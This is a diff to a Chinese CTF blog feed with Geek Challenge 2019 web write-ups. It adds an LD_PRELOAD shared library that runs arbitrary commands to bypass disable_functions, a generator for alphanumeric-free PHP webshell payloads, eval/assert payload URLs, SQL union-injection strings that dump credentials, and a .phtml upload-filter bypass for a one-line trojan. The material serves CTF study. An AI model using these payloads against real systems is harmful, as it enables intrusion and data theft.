@@ -65,7 +65,7 @@
 <h4 id="劫持系统函数绕过disable-functions"><a href="#劫持系统函数绕过disable-functions" class="headerlink" title="劫持系统函数绕过disable_functions"></a>劫持系统函数绕过disable_functions</h4><p>把readflag下载到本地 IDA反编译</p>
 <p> <img src="/2019/10/30/bypass-disable-functions/1571502795907.png" alt="1571502795907"></p>
 <p>bypass.c文件：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ; <span class="comment">//获取环境变量</span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="comment">//获取EVIL_CMDLINE的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>
 
@@ -141,6 +141,9 @@
 <p>GET传参code，code中不能有A-Z，a-z，0-9，这些字符，而且字符限制在40个字符</p>
 <p>所以我们要先绕过这个限制，执行命令。</p>
 <p>参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">p神</a>不含数字和字母的webshell</p>
+<p>构造脚本：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"%"</span>, <span class="string">"\x"</span>, urlencode($aa) . <span class="string">"^"</span> . urlencode($bb) . <span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_url</span><span class="params">($pl)</span> </span>&#123;</span><br><span class="line">    $aa = <span class="string">""</span>;</span><br><span class="line">    $bb = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pl); $j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0xa0</span>; $i &lt; <span class="number">0xff</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) == <span class="number">0</span>) &#123;</span><br><span class="line">                $t = chr($i) ^ $pl[$j];</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $t) == <span class="number">0</span>) &#123;</span><br><span class="line">                    $aa .= chr($i);</span><br><span class="line">                    $bb .= $t;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> urlencode($aa) . <span class="string">"^"</span> . urlencode($bb). <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> gen(<span class="string">"_GET"</span>);</span><br><span class="line"><span class="keyword">echo</span> gen_url(<span class="string">"_GET"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\xA0\xA0\xA0\xA0"</span>^<span class="string">"\xFF\xE7\xE5\xF4"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">"%A0%A0%A0%A0"</span>)^urldecode(<span class="string">"%FF%E7%E5%F4"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+
 <p>构造如下URl</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
 
@@ -199,6 +202,71 @@
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/1571503618681.png" alt="1571503618681"></p>
+<h2 id="李三的代码审计笔记第一页：Talk-is-easy-show-me-the-code"><a href="#李三的代码审计笔记第一页：Talk-is-easy-show-me-the-code" class="headerlink" title="李三的代码审计笔记第一页：Talk is easy ,show me the code."></a>李三的代码审计笔记第一页：Talk is easy ,show me the code.</h2><p>访问题目页面，给了源码</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    ini_set(<span class="string">"max_execution_time"</span>, <span class="string">"60"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">empty</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; <span class="keyword">die</span>();</span><br><span class="line">    $password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">($haystack, $needle)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         $length = strlen($needle);</span><br><span class="line">         <span class="keyword">return</span> (substr($haystack, <span class="number">0</span>, $length) === $needle);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $url = $_GET[<span class="string">"url"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!startsWith($url,<span class="string">"http://"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not allow !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($arr); $i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">false</span>);</span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($output === $arr[$i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($i == sizeof($arr)<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations. Flag is  SYC&#123;********************************&#125;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password is wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在具有公网IP的服务器上，放置以下两个文件</p>
+<p>req.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line">$count=intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$count];</span><br><span class="line"></span><br><span class="line">$count++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$count);</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.txt</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101124245849.png" alt="image-20191101124245849"></p>
+<p>1.txt要有可写权限</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101124431268.png" alt="image-20191101124431268"></p>
+<h2 id="服务端检测系统：emm，自己看"><a href="#服务端检测系统：emm，自己看" class="headerlink" title="服务端检测系统：emm，自己看"></a>服务端检测系统：emm，自己看</h2><h2 id="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"><a href="#Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！" class="headerlink" title="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"></a>Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！</h2><p>熟悉的界面</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101125127520.png" alt="image-20191101125127520"></p>
+<p>同样的手法</p>
+<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">‘</span>=<span class="string">’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">‘=’</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101201215464.png" alt="image-20191101201215464"></p>
+<p>但这个字符串并不是flag，估计在数据库中</p>
+<p>利用Payload测试，禁用了 insert，having等，可以利用<code>#</code> 闭合。</p>
+<p>可以联合注入，报错注入，盲注。</p>
+<p>这里用最简单的联合注入。</p>
+<p>先判断字段数</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101202502733.png" alt="image-20191101202502733"></p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101202533747.png" alt="image-20191101202533747"></p>
+<p>字段数为3</p>
+<p>获取回显点</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101203249710.png" alt="image-20191101203249710"></p>
+<p>获取数据库名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(schema_name)+from+information_schema.schemata%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101203821862.png" alt="image-20191101203821862"></p>
+<p>先关注geek数据库，查表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3d&apos;geek&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101204140891.png" alt="image-20191101204140891"></p>
+<p>查l0ve1ysq1表的字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_schema%3d&apos;geek&apos;+and+table_name%3d&apos;l0ve1ysq1&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101204909589.png" alt="image-20191101204909589"></p>
+<p>获取数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191101213948365.png" alt="image-20191101213948365"></p>
+<h2 id="性感黄阿姨，在线聊天-听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！"><a href="#性感黄阿姨，在线聊天-听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！" class="headerlink" title="性感黄阿姨，在线聊天:听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！"></a>性感黄阿姨，在线聊天:听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！</h2><p>bp抓包</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031113746614.png" alt="image-20191031113746614"></p>
+<p>尝试把guest改成admin</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031114019083.png" alt="image-20191031114019083"></p>
+<p>提示我们要绕过这个判断</p>
+<p>两个等号，第一时间想到的是php弱类型</p>
+<p>利用字符串和数字的比较弱点</p>
+<p>md5加密肯定是个字符串，如果第一个字符是字母转化为数字则为0，如果前两个字符是“1w”，那么转化为数字则为1.</p>
+<p>所以我们利用name传输数字，爆破md5($flag)前面的数字即可绕过。</p>
+<p>在json中，“name”:”0”是字符串，”name”:0 是数字</p>
+<p>配置测试器</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031115415135.png" alt="image-20191031115415135"></p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031115443975.png" alt="image-20191031115443975"></p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031115642982.png" alt="image-20191031115642982"></p>
+<p>经过测试不能带xml声明，Connect-Type改成xml</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031122255387.png" alt="image-20191031122255387"></p>
+<p>利用PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">伪协议</a>和base64加密读取文件内容</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031124114147.png" alt="image-20191031124114147"></p>
+<p>base64解码得到flag</p>
 <h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
 <p>查看源码，发现Secret.php</p>
 <p>打开Secret.php</p>
@@ -234,7 +302,27 @@
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029232338502.png" alt="image-20191029232338502"></p>
 <p>base64解码</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029232357758.png" alt="image-20191029232357758"></p>
-]]></content>
+<h2 id="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ"><a href="#你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ=="></a>你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ==</h2><p>上传正常的图片</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030232940824.png" alt="image-20191030232940824"></p>
+<p>Not image！</p>
+<p>尝试修改Content-Type</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030233157391.png" alt="image-20191030233157391"></p>
+<p>上传成功，但并没有返回文件路径</p>
+<p>盲猜一波upload</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030233348553.png" alt="image-20191030233348553"></p>
+<p>正确</p>
+<p>尝试上传一句话木马</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030233555540.png" alt="image-20191030233555540"></p>
+<p>尝试改后缀</p>
+<p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191030233648512.png" alt="image-20191030233648512"></p>
+<p>phtml可绕过 但不能出现&lt;?</p>
+<p>利用<script language="php">绕过</p>
+<p><img src="image-20191030233844611.png" alt="image-20191030233844611"></p>
+<p>上传成功</p>
+<p>菜刀 连上</p>
+<p><img src="image-20191030234008757.png" alt="image-20191030234008757"></p>
+<p><img src="image-20191030234111964.png" alt="image-20191030234111964"></p>
+</script></p>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
